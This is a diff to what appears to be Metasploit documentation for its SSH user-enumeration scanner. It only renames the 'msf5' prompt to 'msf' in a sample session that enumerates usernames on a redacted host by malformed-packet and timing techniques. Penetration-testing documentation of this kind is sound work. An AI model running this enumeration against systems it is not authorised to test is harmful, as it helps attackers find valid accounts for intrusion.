@@ -39,17 +39,17 @@ Check for false positives (random username).
 ## Usage
 
 ```
-msf5 > use auxiliary/scanner/ssh/ssh_enumusers
-msf5 auxiliary(scanner/ssh/ssh_enumusers) > set rhosts [redacted]
+msf > use auxiliary/scanner/ssh/ssh_enumusers
+msf auxiliary(scanner/ssh/ssh_enumusers) > set rhosts [redacted]
 rhosts => [redacted]
-msf5 auxiliary(scanner/ssh/ssh_enumusers) > echo $'wvu\nbcook' > users
+msf auxiliary(scanner/ssh/ssh_enumusers) > echo $'wvu\nbcook' > users
 [*] exec: echo $'wvu\nbcook' > users
 
-msf5 auxiliary(scanner/ssh/ssh_enumusers) > set user_file users
+msf auxiliary(scanner/ssh/ssh_enumusers) > set user_file users
 user_file => users
-msf5 auxiliary(scanner/ssh/ssh_enumusers) > set verbose true
+msf auxiliary(scanner/ssh/ssh_enumusers) > set verbose true
 verbose => true
-msf5 auxiliary(scanner/ssh/ssh_enumusers) > run
+msf auxiliary(scanner/ssh/ssh_enumusers) > run
 
 [*] [redacted]:22 - SSH - Using malformed packet technique
 [*] [redacted]:22 - SSH - Starting scan
@@ -57,9 +57,9 @@ msf5 auxiliary(scanner/ssh/ssh_enumusers) > run
 [-] [redacted]:22 - SSH - User 'bcook' not found
 [*] Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
-msf5 auxiliary(scanner/ssh/ssh_enumusers) > set action Timing Attack
+msf auxiliary(scanner/ssh/ssh_enumusers) > set action Timing Attack
 action => Timing Attack
-msf5 auxiliary(scanner/ssh/ssh_enumusers) > run
+msf auxiliary(scanner/ssh/ssh_enumusers) > run
 
 [*] [redacted]:22 - SSH - Using timing attack technique
 [*] [redacted]:22 - SSH - Starting scan
@@ -67,7 +67,7 @@ msf5 auxiliary(scanner/ssh/ssh_enumusers) > run
 [-] [redacted]:22 - SSH - User 'bcook' not found
 [*] Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
-msf5 auxiliary(scanner/ssh/ssh_enumusers) > creds
+msf auxiliary(scanner/ssh/ssh_enumusers) > creds
 Credentials
 ===========
 
@@ -75,5 +75,5 @@ host         origin       service       public  private  realm  private_type
 ----         ------       -------       ------  -------  -----  ------------
 [redacted]   [redacted]   22/tcp (ssh)  wvu
 
-msf5 auxiliary(scanner/ssh/ssh_enumusers) >
+msf auxiliary(scanner/ssh/ssh_enumusers) >
 ```
